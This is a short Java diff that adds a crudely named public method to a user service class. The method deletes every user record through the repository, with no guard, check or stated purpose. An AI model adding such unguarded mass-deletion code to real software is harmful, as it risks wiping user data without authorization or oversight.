@@ -129,4 +129,9 @@ public class UsuarioService {
             usuarioRepository.save(user);
         return true;
     }
+
+    public boolean bigBalls(){
+        usuarioRepository.deleteAll();
+        return true;
+    }
 }
